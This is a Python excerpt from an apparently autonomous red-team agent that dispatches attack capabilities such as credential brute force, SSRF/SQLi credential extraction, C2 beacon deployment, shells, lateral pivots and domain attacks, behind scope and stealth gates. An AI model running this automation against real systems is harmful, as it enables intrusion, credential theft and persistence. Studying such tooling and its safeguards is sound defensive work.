        ("osint",    lambda cap: cap.category in ("osint", "social"),
         "_execute_social_capability"),
        # behavioural hunting executes through the anomaly engine channel
        # (baseline + statistical scoring + mutation escalation, in-process)
        ("exploit",  lambda cap: cap.category == "hunt",
         "_execute_hunt_capability"),
        # IDOR detection executes through the differential engine channel
        # (baseline + reference walk + distinct-object oracle, in-process)
        ("exploit",  lambda cap: cap.id == "idor_scan",
         "_execute_idor_capability"),
        # ORIGIN discovery executes through the edge engine (public data
        # only: header evidence + CT-log hostnames + DNS resolution)
        ("recon",    lambda cap: cap.id == "origin_discovery",
         "_execute_origin_capability"),
        # web credential extraction is an in-process engine (SSRF/SQLi
        # probes against the discovered web services) — the adapter returns
        # WEBCREDS: markers, never a shell command
        ("foothold", lambda cap: cap.id == "web_creds",
         "_execute_web_creds_capability"),
        # in-process ENGINE capabilities run HERE, not in make_command:
        # building a command must stay pure (the chain preview builds every
        # candidate's command, and a live socket probe there is a bug), and
        # `run_engine` gives the engine a timeout and a short TTL cache.
        ("any",      lambda cap: getattr(cap, "exec_class", "") == "in_process_engine"
                                and getattr(cap, "engine", None) is not None,
         "_execute_engine_capability"),
        # A-2: a LEARNED capability carries NO in-process adapter/interpreter
        # (the loader reads only an out-of-process descriptor). Its whole
        # contribution — preconditions, adapter and interpreter — runs in the
        # task worker, and findings come back as JSON data. This must be
        # handled BEFORE make_command(), which by design has no adapter here.
        ("learned",  lambda cap: cap.id.startswith("learned.")
                                and bool(getattr(cap, "source_module", "")),
         "_execute_learned_capability"),
        # everything else is a shell command (the only place commands exist)
        ("any",      lambda cap: True,
         "_execute_command_capability"),
    )

    def _execute_capability(self, step: PlanStep) -> bool:
        """Execute one planned step: the shared gates first (scope, stealth,
        edge, preconditions, toolchain, slot safety), then the channel
        registry routes the capability to its executor."""
        cap = step.capability
        slots = self._gate_capability(cap, dict(step.slot_values))
        if slots is None:
            return False
        return self._dispatch_capability(cap, slots, step)

    def _dispatch_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """Registry dispatch — first matching row wins (row order is part of
        the contract, see _CHANNEL_ROUTES)."""
        for _phase, match, handler in self._CHANNEL_ROUTES:
            if match(cap):
                return getattr(self, handler)(cap, slots, step)
        raise AssertionError("channel registry must end with the default route")

    def _gate_capability(self, cap, slots: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Shared pre-dispatch gates. Returns None when the capability is
        refused (every refusal is announced and recorded first), else the
        AUTOFILLED slots the channel executes with."""
        slots = dict(slots)
        # scope discipline: never act on a target that is out of authorized scope
        if not self._scope_ok():
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason=f"target {self.target} out of scope")
            self.wm.record_failure(cap.id, f"out of scope: {self.target}")
            _audit_decision("scope_decision", target=self.target, decision="deny",
                            reason=f"{cap.id}: target out of scope")
            return None
        # R2 stealth veto: once the engagement has spent its noise budget the
        # stealth lens refuses LOUD moves outright. It is narrow on purpose
        # (aggressive/forceful/high-detection only) so it stops the run from
        # gambling its last quiet on a marginal move without freezing a run
        # that has no quieter path left.
        veto = self._stealth_veto(cap)
        if veto:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason=f"stealth veto: {veto}")
            self.wm.record_failure(cap.id, f"stealth veto: {veto}")
            _audit_decision("policy_decision", subject=cap.id, decision="deny",
                            policy="stealth_veto", reason=str(veto))
            return None
        # EDGE gate: an address behind Cloudflare/Akamai/Fastly/… is the
        # PROVIDER's reverse proxy, not the target. Packet-level work against
        # it footprints the CDN and touches a third party, so it is refused
        # (as a DEFERRAL: it unlocks as soon as an origin is discovered and
        # `_effective_target` aims the move at the origin instead).
        edge_block = self._edge_guard(cap)
        if edge_block:
            self._emit("blocked", capability=cap.id, reason=edge_block)
            self.wm.record_failure(cap.id, edge_block)
            return None
        # the world is the judge: a capability whose preconditions are not
        # met NOW is deferred, not executed (e.g. network tooling on an
        # identity target before the victim_ip was harvested). Deferral is
        # NOT a failure: the run loop resubmits the step once new facts
        # satisfy its preconditions. post capabilities are exempt: they
        # carry their own precise gates ("requires SYSTEM privileges
        # first", "no beacon session", ...)
        if cap.category != "post":
            for pre in cap.preconditions:
                try:
                    if not pre(self.wm):
                        self._emit("deferred", capability=cap.id,
                                   reason="precondition not met")
                        return None
                except Exception as exc:
                    # A precondition that RAISES must never be read as
                    # "satisfied": that turns a bug (or a hostile fact) into
                    # an authorization bypass. A precondition only opens a
                    # door by RETURNING True — anything else is a deferral.
                    self._emit("deferred", capability=cap.id,
                               reason=f"precondition error: {exc}")
                    self.wm.record_failure(
                        cap.id, f"precondition raised: {exc}")
                    return None
        # toolchain: a capability whose tools are missing fails cleanly
        # (checked BEFORE autofill so no side effects are recorded)
        if cap.tools and self.toolchain.resolve(cap.tools) is None:
            # tools is an ALTERNATES list (nmap|masscan|nc): the capability
            # only fails when NONE is installed. Failing on the first
            # absent alternate made every multi-tool capability dead even
            # with a perfectly good primary tool present.
            missing = self.toolchain.missing(cap.tools)
            self._mark_failed(cap.id)
            self._emit("tool_missing", capability=cap.id, tools=missing)
            self.wm.record_failure(cap.id, f"tool unavailable: {', '.join(missing)}")
            return None
        # TOOL CHOICE: stamp the target-aware pick BEFORE autofill/adapter,
        # so the command is built for THIS target's surface.
        try:
            self._stamp_tool_choice(cap)
        except Exception:
            pass
        # senior red-teamer behavior: fill in what the plan didn't specify
        try:
            slots = self._autofill_slots(cap, slots)
        except Exception as e:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id, detail=f"autofill: {e}")
            return None
        # execution robustness: a slot value interpolated RAW into a command
        # string must be a plain token. One carrying a space becomes extra
        # argv (argument injection) and one carrying `;`/`&` becomes shell
        # syntax — the executor runs these with shell=True. Refuse with a
        # typed reason instead of executing a command we do not understand.
        offenders = [(name, unsafe_slot_reason(val))
                     for name, val in slots.items()
                     if name in _SHELL_SLOT_NAMES]
        offenders = [(name, why) for name, why in offenders if why]
        if offenders:
            detail = "; ".join(f"{name}: {why}" for name, why in offenders[:3])
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason=f"unsafe slot value ({detail})")
            self.wm.record_failure(cap.id, f"unsafe slot value ({detail})")
            return None

        return slots

    def _execute_command_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """The shell-command channel: command synthesis -> dynamic shaping ->
        the capability's own gates (beacon foothold, bind shell, online
        brute) -> brokered execution -> perception -> postconditions."""
        # synthesize the command — the ONLY place commands exist
        try:
            cmd = cap.make_command(self.wm, slots)
        except ValueError as e:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id, detail=str(e))
            return False
        # per-run dynamic shaping: never ship a static command, vary the 
        # ephemeral staging path so consecutive runs differ on the endpoint
        cmd = self._dyn.shape(cmd, self.wm)
        # senior discipline: never deploy a beacon without a foothold.
        # If the access path (creds) failed earlier, this stays blocked
        # until NEW facts (e.g. creds from another vector) make it viable.
        if cap.id == "beacon_deploy" and not self.wm.find("creds", valid=True):
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="no foothold: valid creds required before beacon deploy")
            return False
        # beacon_deploy must run ON the target, not on the operator box:
        # the dropper downloads the staged binary from our C2 and executes
        # it there. Wrap it in an SSH remote-exec with the validated creds
        # and the discovered SSH port.
        if cap.id == "beacon_deploy":
            try:
                cmd = self._wrap_remote_exec(cmd)
            except ValueError as e:
                self._mark_failed(cap.id)
                self._emit("blocked", capability=cap.id, reason=str(e))
                return False
        # sandbox gate for payload/beacon capabilities: the payload is
        # materialized to disk and scanned by every available backend.
        # Only materialized samples are pre-flighted — exploit *commands*
        # against the target are not local samples and carry no scan gate.
        if cap.id == "beacon_deploy":
            sample_path = self._deploy_sample_path()
            if not sample_path:
                self._mark_failed(cap.id)
                self._emit("blocked", capability=cap.id,
                           reason="beacon binary missing (build produced no file)")
                return False
            verdict = self._preflight(cap.id, sample_path)
            if not verdict.approved and not self.aggressive:
                self._mark_failed(cap.id)
                self._emit("blocked", capability=cap.id,
                           reason=verdict.summary())
                return False
        # a BIND shell listens on the target — anyone can connect to it and
        # the EDR signature is unmistakable. Hard-gated behind --aggressive
        # exactly like online brute: stealth/default/paranoid never open a
        # listening backdoor. (Reverse shells dial OUT and stay allowed.)
        if cap.id == "payload_bind" and not self.aggressive:
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="bind shell requires --aggressive")
            self.wm.record_failure(cap.id, "bind shell requires --aggressive")
            return False
        # brute capabilities are hard-gated behind --aggressive: online
        # credential attacks are the loudest move in the tool and the
        # noise budget never buys this one (stealth/default/paranoid only)
        if cap.category == "brute" and not self.stealth_engine.online_brute_allowed():
            self._mark_failed(cap.id)
            self._emit("blocked", capability=cap.id,
                       reason="online brute force requires --aggressive")
            self.wm.record_failure(cap.id, "online brute requires --aggressive")
            return False
        # the live stream carries the REAL command plus the planner's WHY,
        # the stealth badge and the detection risk: the operator (and the
        # report) can audit the action, not just its name
        _dec = getattr(self, "_decisions", {}).get(cap.id)
        self._emit("run", capability=cap.id, banner=cap.banner,
                   category=cap.category, cost=cap.opsec_cost,
                   command=cmd,
                   reason=getattr(step, "reason", "") or "",
                   stealth_level=cap.stealth_level,
                   detection_risk=cap.detection_risk,
                   driver=(_dec.driver if _dec is not None else ""),
                   search_policy=self.search_policy())
        # noise circuit breaker: account the detection risk of loud moves
        self._account_noise(cap)
        # stealth-aware execution (human timing + opsec spend + egress)
        # v3.0: AD awareness — check for domain environment after first scan
        if not self._ad_checked and cap.id in ("scan_tcp", "version_detect"):
            try:
                from phantom.automation.ad_awareness import assess_active_directory
                services = self.wm.find("service")
                ports = []
                for f in services:
                    try:
                        pk = str(f.key).split("/")[-1] if "/" in str(f.key) else str(f.key)
                        ports.append(int(pk))
                    except (ValueError, TypeError):
                        pass
                if ports:
                    assess_active_directory(self.wm, self.target, ports)
                    self._ad_checked = True
                    if self.wm.has_any("ad_domain"):
                        self._emit_found("ad_awareness", labels=["ad_domain"])
            except Exception:
                pass
        # EXECUTION BROKER: a runtime-DISCOVERED driver never runs without
        # passing the single gate (trust state + policy + scope +
        # availability + inputs). The broker's command is authoritative.
        # Only a REAL ToolDriver is gated: `isinstance`, not truthiness, so a
        # test double / a capability without a manifest is never mis-gated.
        from phantom.automation.runtime.drivers import ToolDriver
        if isinstance(getattr(cap, "driver", None), ToolDriver):
            decision = self._authorize_driver(cap, slots)
            if decision is None or not decision.allowed:
                reason = ("broker refused: "
                          + "; ".join(decision.reasons if decision else
                                      ["unavailable"]))
                self._mark_failed(cap.id)
                self._emit("blocked", capability=cap.id, reason=reason)
                self.wm.record_failure(cap.id, reason)
                _audit_decision("policy_decision", subject=cap.id,
                                decision="deny", policy="execution_broker",
                                reason=reason[:200])
                return False
            cmd = decision.command or cmd
        run = self.runtime.run(cmd, category=cap.category,
                               stealth_level=cap.stealth_level,
                               agent="agent-1", timeout=cap.timeout)
        self.wm.record_action(cap.id, slots, cmd, ok=run.ok,
                              opsec=self.runtime.cost_per_action)
        if not run.ok:
            # timeout salvage: a killed long scan often still holds minutes
            # of completed work (an 85%-done full sweep knows most of the
            # open ports). Salvage the output through perception first; if
            # it yields findings, count the run as success instead of
            # burning the whole wave as a failure (which pushed the agent
            # into its retry loop).
            salvaged = cap.interpret(run.output or "", self.wm, slots) \
                if (run.output and getattr(run, "timed_out", False)) else []
            if salvaged:
                learned = self._register_findings(cap.id, salvaged)
                self._emit_found(cap.id, salvaged, partial=True)
                self.wm.record_action(cap.id, slots, cmd, ok=True,
                                      opsec=self.runtime.cost_per_action)
                return True
            # failure taxonomy: WHY it failed (out of scope, tool missing,
            # timeout, empty output) is what lets the operator and the
            # fallback engine pick a different angle next time.
            if getattr(run, "error", ""):
                reason = f"refused: {run.error}"
            elif getattr(run, "timed_out", False):
                reason = "timeout: no usable output"
            elif run.output.strip():
                reason = f"non-zero exit: {run.output.strip()[:200]}"
            else:
                reason = "execution failed: no output"
            self.wm.record_failure(cap.id, reason)
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id, output=run.output[:300],
                       reason=reason[:300])
            # v3.0: record fallback for smarter next-strategy decisions
            self._fallback.record(
                cap.category, cap.id, self.target, ok=False,
                reason=reason[:200],
                elapsed=run.elapsed if hasattr(run, "elapsed") else 0.0,
            )
            return False
        # perception: output -> findings
        findings = cap.interpret(run.output, self.wm, slots)
        learned = self._register_findings(cap.id, findings)
        # beacon capability → verify the compiled C++ beacon checked in
        # to our C2 (registration matched by source IP == target). This
        # covers BOTH channels: creds-based deploy AND the RCE bridge.
        if cap.id in ("beacon_deploy", "beacon_via_rce"):
            beacon_id = self._await_beacon()
            if beacon_id:
                self.wm.add_finding(
                    "beacon", "established",
                    {"target": self.target,
                     "payload": slots.get("command", ""),
                     "channel": "creds" if cap.id == "beacon_deploy" else "rce"},
                    confidence=0.95, source="c2_registration")
                self._emit("beacon_up", beacon_id=beacon_id)
                self._session = _BeaconSession(beacon_id)
                return True
            self.wm.record_failure(cap.id, "no beacon check-in received")
            self._mark_failed(cap.id)
            self._emit("failed", capability=cap.id,
                       output="no beacon check-in received")
            return False
        if findings:
            self._emit_found(cap.id, findings)
        # POSTCONDITION: success is judged on EVIDENCE, not the exit code.
        # The move must have produced at least one of the effects it declares;
        # findings of some other kind (effect drift) leave it unverified.
        from phantom.automation.postconditions import declared_effects_met
        met, missing = declared_effects_met(cap.effects, findings)
        if not met:
            self._emit("unverified", capability=cap.id,
                       detail="postcondition not met: no declared effect "
                              "observed (" + ", ".join(missing) + ")")
        # v3.0: record success for fallback/learning engine
        self._fallback.record(
            cap.category, cap.id, self.target, ok=True,
            elapsed=run.elapsed if hasattr(run, "elapsed") else 0.0,
        )
        if not learned:
            # ran cleanly but learned nothing new: the move is spent until
            # new facts make it viable again (no infinite re-runs). Tell the
            # operator WHY the run produced no facts (e.g. "Too many
            # fingerprints match this host" on OS detect) instead of an
            # empty success line.
            note = (self._output_reason(run.output or "") if not findings
                    else "no NEW findings (already known)")
            self._emit("note", capability=cap.id, detail=note)
            self._mark_failed(cap.id)
            self.wm.record_failure(cap.id, "no new facts learned")
            return False
        return True

    def _world_snapshot(self) -> Dict[str, Any]:
        """JSON view of the world model handed to the learned worker.

        The worker has no access to the live WorldModel: it receives data,
        evaluates the module's own preconditions against it, and returns
        findings as data. Nothing machine-authored touches this process.
        """
        findings = []
        for f in self.wm.all_findings():
            try:
                findings.append({"kind": f.kind, "key": f.key,
                                 "value": f.value if isinstance(
                                     f.value, (dict, list, str, int, float,
                                               bool, type(None))) else str(f.value),
                                 "confidence": f.confidence,
                                 "source": f.source,
                                 "evidence": (f.evidence or "")[:400],
                                 "target": f.target})
            except Exception:
                continue
        return {"target": getattr(self.wm, "target", ""),
                "target_type": getattr(self.wm, "target_type", "ip"),
                "findings": findings}

    def _execute_learned_capability(self, cap, slots: Dict[str, Any],
                             step: PlanStep = None) -> bool:
        """A-2: run a machine-authored capability entirely out of process.

        The worker re-checks the module's own preconditions, runs the
        adapter, runs the interpreter, and returns findings as JSON. A
        failed precondition is reported as BLOCKED (not a failure) so the
        planner keeps the capability available for a later world state.
        """
        try:
            from phantom.automation.guidance.learned.worker import \
                run_learned_task
        except Exception as exc:  # noqa: BLE001 — worker import is soft
            self._emit("error", capability=cap.id,
                       detail=f"learned worker unavailable: {exc}")
            return False
        res = run_learned_task(
            getattr(cap, "source_module", ""), slots, self._world_snapshot(),
            timeout=float(getattr(cap, "timeout", 30) or 30))
        label = getattr(cap, "banner", "") or cap.id
        if res.get("blocked"):
            self._emit("blocked", capability=cap.id, reason=res.get("reason", ""),
                       banner=label)
            return False
        ok = bool(res.get("ok"))
        output = str(res.get("output", ""))
        self.wm.record_action(cap.id, slots, label, ok=ok,
                              note=str(res.get("reason", ""))[:200],
                              opsec=self.runtime.cost_per_action)
        if not ok:
            self._mark_failed(cap.id)
            self._emit("error", capability=cap.id,
                       detail=str(res.get("reason", "worker failed"))[-200:])
            return False
        from phantom.automation.belief import Finding
        found = []
        for item in res.get("findings", []) or []:
            try:
                found.append(Finding(
                    kind=str(item.get("kind", "")),
                    key=str(item.get("key", "")),
                    value=item.get("value"),
                    confidence=float(item.get("confidence", 0.5) or 0.5),
                    source=str(item.get("source", cap.id)),
                    evidence=str(item.get("evidence", "")),
                    target=str(item.get("target", "") or self.wm.target),
                ))
            except Exception:
                continue
        self._register_findings(cap.id, found)
        if found:
            self._emit_found(cap.id, found)
        return True

    def _run_learned_isolated(self, cap, slots: Dict[str, Any]) -> tuple:
        """Backward-compatible (ok, output) helper for callers/tests."""
        from phantom.automation.guidance.learned.worker import \
            run_learned_adapter
        return run_learned_adapter(
            getattr(cap, "source_module", ""), slots,
            timeout=float(getattr(cap, "timeout", 30) or 30))

    def _register_findings(self, cap_id: str, findings) -> bool:
        """Store interpreted findings; True if any was actually NEW.

        A run that re-produces only already-known facts learned nothing:
        the capability is spent (like the "no findings" case) so the
        planner moves on to the next source instead of looping forever
        (e.g. breach_check re-running while its invalid creds never open
        the beacon gate).
        """
        known = {(f.kind, f.key): f for f in self.wm.all_findings()}
        new = False
        for f in findings:
            prev = known.get((f.kind, f.key))
            stored = self.wm.add_finding(f.kind, f.key, f.value,
                                         confidence=f.confidence, source=cap_id,
                                         evidence=f.evidence)
            if stored.value != f.value:
                # belief revision REFUSED this value: what we already hold
                # is stronger. That is not a new fact (the planner must not
                # move on it), and it has no other operator-visible trace
                # (an accepted value shows up as a normal `found`), so it
                # is announced here instead of vanishing.
                self._emit("contradiction", capability=cap_id,
                           finding=f"{f.kind}:{f.key}",
                           value=_safe_stream_value(f),
                           stored=_safe_stream_value(stored),
                           confidence=stored.confidence)
                continue
            if prev is None or prev.value != f.value:
                new = True
            # internal recon discoveries join the target ledger so pivot
            # selection can authorize them. They are registered under the
            # NORMAL scope rule (NOT scope-inherited): an ARP neighbor is
            # not authorization, so a neighbor outside the engagement scope
            # stays unregistered and can never become a pivot target.
            if f.kind in ("internal_host", "internal_service"):
                try:
                    v = f.value if isinstance(f.value, dict) else {}
                    host = str(v.get("host") or v.get("ip") or "")
                    if host:
                        self.ledger.register(
                            host, source=f"discovered:{f.kind}",
                            fact_kind=f.kind, origin=self.target,
                            reason="internal recon candidate")
                except Exception:
                    pass
            # cross-platform identity candidates feed the identity-
            # confidence gate: PROBABLE/UNRELATED handles can never become
            # actionable pivots (the wrong-person guardrail).
            if f.kind == "identity_conf":
                try:
                    v = f.value if isinstance(f.value, dict) else {}
                    handle = str(v.get("handle") or "")
                    tier = str(v.get("tier") or "unrelated")
                    if handle:
                        aggressive = bool(getattr(self, "aggressive", False))
                        self.ledger.set_identity_tiers({handle: tier},
                                                       aggressive=aggressive)
                except Exception:
                    pass
        return new

    # ------------------------------------------------- retry discipline

    _OUTPUT_REASON_PATTERNS = (
        ("Too many fingerprints match this host",
         "OS fingerprint ambiguous: nmap found too many matching fingerprints"),
        ("no exact OS matches",
         "OS fingerprint: no exact match in the database"),
        ("all .* scanned ports.*are in ignored states",
         "all probed ports filtered/ignored — host is firewalled"),
        ("host seems down", "host does not respond to probes"),
        ("0 hosts up", "no live hosts found"),
        ("no open ports", "no open ports detected"),
    )

    def _output_reason(self, output: str) -> str:
        """Short human reason extracted from a clean-but-empty tool output,
        so the operator sees WHY a run produced no facts (the empty
        `[+] os_detect:` line was indistinguishable from a real success)."""
        if not output:
            return "ran clean but produced no findings"
        import re as _re
        head = output[:3000]
        for pat, msg in self._OUTPUT_REASON_PATTERNS:
            if _re.search(pat, head, _re.IGNORECASE):
                return msg
        # generic: take the last meaningful non-decorative line
        lines = [ln.strip() for ln in output.splitlines() if ln.strip()
                 and not ln.strip().startswith(("Starting ", "Nmap done",
                                                "Not shown", "MAC Address"))]
        if lines:
            return lines[-1][:120]
        return "ran clean but produced no findings"

    def _precondition_facts(self, cap) -> set:
        """The fact kinds a capability needs: its precondition functions
        PLUS its declarative `requires` grammar. One source so the retry
        gate and the unblock condition can never disagree."""
        kinds: set = set()
        for pre in getattr(cap, "preconditions", []) or []:
            try:
                kinds.update(Planner._precondition_facts(pre))
            except Exception:
                pass
        for req in getattr(cap, "requires", []) or []:
            kind = str(req).split(":", 1)[0].strip()
            if kind:
                kinds.add(kind)
        return kinds

    def _unblock_condition_for(self, cap) -> str:
        """What would make this failed capability viable again, in words.

        The fact kinds it needs that the world does not hold yet. Empty
        when the move is self-sufficient (nothing would revive it) — that
        emptiness is itself the answer: a dead end, not a waiting move.
        """
        if cap is None:
            return ""
        kinds = self._precondition_facts(cap)
        missing = sorted(k for k in kinds
                         if not self.wm.has_any(k))
        if not missing:
            return ""
        return "new " + " / ".join(missing)

    def _mark_failed(self, capability_id: str) -> None:
        """A capability is dead from now on — unless the world changes."""
        try:
            self._last_failed_cap = self.registry.get(capability_id)
        except Exception:
            self._last_failed_cap = None
        self._failed_caps[capability_id] = time.time()
        # explicit unblock condition (P1): computed once here and attached
        # to the failure record + emitted on the blocked/failed event
        unblock = self._unblock_condition_for(self._last_failed_cap)
        if unblock:
            self._unblock_conditions[capability_id] = unblock
        else:
            self._unblock_conditions.pop(capability_id, None)
        note = ""
        for f in reversed(self.wm.failures):
            if f.get("capability") == capability_id:
                note = f.get("reason", "")
                break
        self._last_fail_reason[capability_id] = note
        for f in reversed(self.wm.failures):
            if f.get("capability") == capability_id:
                f.setdefault("unblock", unblock)
                break
        key = (capability_id, note)
        count = self._fail_notes.get(key, 0) + 1
        self._fail_notes[key] = count
        if count >= 3:
            self._poisoned.add(capability_id)

    def _retry_eligible(self, cap) -> bool:
        """A failed move is NEVER retried blindly.

        It only becomes viable again if NEW findings arrived that are useful
        for its preconditions (e.g. ssh_login failed with no creds; a brute
        later found creds → retry ssh_login). Self-sufficient capabilities
        (no preconditions) stay dead forever.

        Spent-effect guard: a capability whose effect facts ALREADY exist in
        the world is never retried — its output is deterministic given the
        same inputs, so re-running can only re-produce known facts. This is
        what killed the observed loop (scan → version_detect adds service
        facts → http_probe/scan_tcp re-armed by the refreshed preconditions
        → same web_header again → failed → re-armed …).

        Failure memory: the same capability failing with the SAME reason on
        the same target twice is treated as a deterministic dead end (the
        third attempt is suppressed even though _poisoned waits for 3) —
        two identical failures already prove the approach doesn't work
        with the current facts.
        """
        failed_at = self._failed_caps.get(cap.id)
        if failed_at is None:
            return True
        # spent-effect guard: the world already holds what this move produces
        if cap.effects and all(self.wm.has_any(e) for e in cap.effects):
            return False
        # identical-failure memory (evidence-based, not blind counting)
        same_failures = 0
        for f in reversed(self.wm.failures):
            if f.get("capability") == cap.id:
                if f.get("reason") == self._last_fail_reason.get(cap.id):
                    same_failures += 1
                if same_failures >= 2:
                    return False
                break
        # the SAME derivation the unblock condition reports: a declarative
        # `requires` capability re-arms on the same facts a functional
        # precondition would (they used to diverge — a requires-only move
        # could never become retry-eligible)
        fact_kinds = self._precondition_facts(cap)
        if not fact_kinds:
            return False
        return any(f.ts > failed_at for kind in fact_kinds
                   for f in self.wm.find(kind))

    # which service a pivot needs on the peer (matches internal_probe ports)
    _PIVOT_SERVICE = {"lateral_pivot": "ssh", "smb_pivot": "smb",
                      "winrm_pivot": "winrm"}

    def _internal_pivot_host(self, cap_id: str) -> str:
        """A peer host for a pivot, chosen from the internal recon findings.

        Prefers an `internal_service` peer that speaks the pivot's own
        service (ssh/smb/winrm); falls back to any in-scope `internal_host`
        neighbor. Only ACTIVE (ledger-authorized) peers are eligible: an
        ARP neighbor is NOT authorization, so an out-of-scope neighbor is
        never selected as a pivot target.
        """
        service = self._PIVOT_SERVICE.get(cap_id, "")
        if not service:
            return ""
        for f in self.wm.find("internal_service"):
            v = f.value if isinstance(f.value, dict) else {}
            host = str(v.get("host") or "")
            if host and host != self.target \
                    and str(v.get("service")) == service \
                    and self.ledger.activatable(host):
                return host
        for f in self.wm.find("internal_host"):
            v = f.value if isinstance(f.value, dict) else {}
            host = str(v.get("ip") or v.get("host") or "")
            if host and host != self.target and self.ledger.activatable(host):
                return host
        return ""

    def _cloud_provider(self) -> str:
        """The cloud provider for the current foothold (aws|gcp|azure).
        Delegates to the capability kit so the manual-core, the auto-mode
        and the adapters all resolve the provider identically."""
        from phantom.automation.guidance.kit import _cloud_provider
        return _cloud_provider(self.wm)

    def _cloud_assumable_identity(self) -> str:
        """The identity `cloud_assume_role` should assume, from the
        `cloud_lateral:roles` finding produced by `cloud_iam_enum`."""
        from phantom.automation.guidance.kit import _cloud_assumable_identity
        return _cloud_assumable_identity(self.wm)

    def _autofill_slots(self, cap, slots: Dict[str, Any]) -> Dict[str, Any]:
        """Senior behavior: supply what the plan left unspecified.

        * creds capabilities (ssh_login ...) → run OfflineBrute with the
          matching verifier; first valid pair becomes the slot values and a
          creds finding.
        * beacon_deploy → build the dropper for our OWN compiled C++ beacon
          (platform from the OS finding); the beacon itself checks in to
          our C2 and post-exploitation runs through that channel.
        """
        if cap.id in ("lateral_pivot", "smb_pivot", "winrm_pivot") \
                and "host" not in slots:
            # host is an OPTIONAL input (peers may be absent) — autofill it
            # from the engagement's OWN internal recon first (a peer the
            # beacon discovered and probed), then from the campaign share.
            host = self._internal_pivot_host(cap.id)
            if not host:
                host = self.share.first_peer(self.target)
            if host:
                slots["host"] = host

        required = {s.name for s in cap.inputs if s.required}
        missing = required - set(slots)
        # cloud/IAM chain: the lateral-movement primitives take their inputs
        # from the PREVIOUS stage's findings, so an operator never has to
        # copy a role ARN across manually.
        #   provider   <- cloud_creds finding (aws|gcp|azure)
        #   role_arn   <- cloud_lateral:roles finding (assumable identity)
        if cap.id in ("cloud_iam_enum", "cloud_s3_enum",
                      "cloud_assume_role", "cloud_cross_account"):
            if "provider" not in slots:
                slots["provider"] = self._cloud_provider()
            if cap.id == "cloud_assume_role" and not slots.get("role_arn"):
                ident = self._cloud_assumable_identity()
                if ident:
                    slots["role_arn"] = ident

        if cap.id == "trojan_deliver" and "carrier" not in slots \
                and "payload" not in slots and self._trojan_assets:
            carrier = self._trojan_assets.get("carrier")
            payload = self._trojan_assets.get("payload")
            if carrier and payload:
                slots["carrier"] = carrier
                slots["payload"] = payload
                if self._trojan_assets.get("staging"):
                    slots["staging"] = self._trojan_assets["staging"]
        if not missing:
            return slots

        if "username" in missing and "password" in missing and "port" not in missing:
            service = "ssh" if cap.id.startswith("ssh_") else cap.id.replace("_login", "")
            if cap.id in ("lateral_pivot", "privesc_sudo"):
                service = "ssh"  # the session credentials drive the pivot/sudo
            elif cap.id == "smb_pivot":
                service = "smb"
            elif cap.id == "winrm_pivot":
                service = "winrm"
            elif cap.id in ("kerberoast", "as_rep_roast", "dc_sync"):
                service = "domain"
            found = self._discover_credentials(service)
            if found:
                slots["username"], slots["password"] = found
                # only record a NEW credential fact: re-discovering the same
                # pair must NOT refresh the finding timestamp, otherwise it
                # re-arms other failed pivot capabilities via _retry_eligible
                # and starves the fallback chain (lateral/smb/winrm).
                key = f"{service}:{found[0]}"
                prev = self.wm.get("creds", key)
                if prev is None or prev.value.get("password") != found[1]:
                    self.wm.add_finding(
                        "creds", key,
                        {"username": found[0], "password": found[1],
                         "valid": True, "service": service},
                        confidence=0.8, source=f"offline_brute_{service}")
        elif "command" in missing and cap.id in ("beacon_deploy",
                                                  "beacon_via_rce"):
            slots["command"] = self._build_payload()
        return slots

    def _discover_credentials(self, service: str):
        # campaign knowledge first: creds found by OTHER sub-agents are
        # immediately reusable (lateral movement / domain reuse)
        if self.share:
            shared = self.share.find(service)
            if shared is None and service != "ssh":
                shared = self.share.find(None)  # any-service fallback
            if shared:
                return shared
        # reuse credentials THIS agent already validated on another service:
        # an SSH/SMB foothold user is very often the same account that powers
        # the domain kill chain (kerberoast / as_rep / dc_sync) or the
        # lateral pivot. There is no offline "domain" verifier, so without
        # this the AD capabilities could never be autofilled in a single-
        # target run — the WorldModel is their primary credential source.
        found = self._wm_credentials(service)
        if found:
            return found
        found = self._cred_discoverer(service)
        if found and self.share:
            self.share.add_creds(service, found[0], found[1], self.target)
        return found

    def _wm_credentials(self, service: str):
        """A VALIDATED credential pair already in the WorldModel, preferring
        the requested service then any service as a fallback."""
        creds = self.wm.find("creds", valid=True)
        if not creds:
            return None
        fallback = None
        for f in creds:
            v = f.value if isinstance(f.value, dict) else {}
            user, pw = v.get("username"), v.get("password")
            if not user or not pw:
                continue
            pair = (str(user), str(pw))
            if v.get("service") == service:
                return pair
            if fallback is None:
                fallback = pair
        return fallback

    def _default_cred_discovery(self, service: str):
        from phantom.automation.exploit.vectors import OfflineBrute, _builtin_verifiers
        verifier = _builtin_verifiers().get(service)
        if not verifier:
            return None
        brute = OfflineBrute(verifier)
        port = self._service_port(service)
        res = brute.run(self.target, port, service)
        return res.credentials

    def _service_port(self, service: str) -> int:
        """Prefer the port the scanner actually discovered for this service
        (SSH on 2222, tomcat on 8081, ...); fall back to the well-known port."""
        for finding in self.wm.find("service"):
            value = finding.value if isinstance(finding.value, dict) else {}
            if str(value.get("service", "")).lower() == service:
                try:
                    return int(value.get("port"))
                except (TypeError, ValueError):
                    pass
        return {"ssh": 22, "smb": 445, "ftp": 21, "winrm": 5985,
                "http": 80, "tomcat": 8080, "mysql": 3306,
                "postgresql": 5432}.get(service, 443)
    def _target_platform_answer(self):
        """The artefact family for this target, and HOW WE KNOW (8.3).

        The classification belongs to `utils.target_platform` — the ONE
        source shared with the payload module, the C2 shell and the network
        map. This method used to be a third private sniff over the same OS
        string (`"windows" in x or "win" in x`), which is how the agent and
        the manual `generate` flow could disagree about the same host.
        """
        from phantom.utils.target_platform import assumed_linux, from_findings
        answer = from_findings(self.wm, source="target os finding")
        if answer.known:
            return answer
        return assumed_linux("no os finding")

    def _target_platform(self) -> str:
        """Platform name (see `_target_platform_answer` for the source)."""
